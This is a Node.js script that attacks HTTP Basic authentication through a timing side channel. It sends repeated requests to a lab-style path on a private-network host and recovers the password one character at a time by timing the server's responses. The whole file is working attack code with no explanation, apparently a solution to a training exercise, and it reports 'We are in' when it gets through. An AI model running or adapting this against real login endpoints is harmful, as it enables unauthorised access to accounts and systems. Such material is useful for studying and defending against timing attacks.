var http = require('http');

function guessPassword(theHost, username, password, callback) {
    var options = {
        method: 'get',
        host: theHost,
        port: 80,
        path: '/authentication/example2/',
        headers: {
         'Authorization': 'Basic ' + new Buffer(username + ':' + password).toString('base64')
        },
        agent:false
    };

    var startTime;
    var req = http.request(options, function(res) {
        var timeTaken = process.hrtime(startTime);
        callback(res.statusCode == 200, timeTaken[0]*1000+timeTaken[1]/1000000);
    }).on('error', function(error) {
        console.log(error);
    });
    startTime = process.hrtime();
    req.end();
}

// Our info
var theHost = '192.168.1.25';
var username = 'hacker';

var passwordChars = '1234567890abcdefghijklmnopqrstuvwxyz';

var overallPassword = '';
function bigCont() {
    var i=0;
    var max = 0;
    var res = [];
    var ourChar = '';
    function cont() {
        var guessChar = passwordChars[i];
        guessPassword(theHost, username, overallPassword + guessChar, function(success, timeTaken) {
            if(success) {
                console.log('We are in: ' + overallPassword + guessChar);
                return;
            }

            console.log('Testing ' + guessChar + ' - ' + timeTaken);
            if(timeTaken > max) {
                max = timeTaken;
                ourChar = guessChar;
                console.log('new leader: ' + ourChar);
            }

            res.push([guessChar, timeTaken]);

            if(++i < passwordChars.length) {
                cont();
            } else {
                res.sort(function(a, b) {
                    return b[1] - a[1];
                });

                for(var j=0; j<res.length; ++j) {
                    console.log(res[j][0] + ' - ' + res[j][1]);
                }

                overallPassword += res[0][0];

                console.log('Password so far: ' + overallPassword);

                // Comtinue
                bigCont();
            }
        });
    }

    // Start
    cont();
}

bigCont();
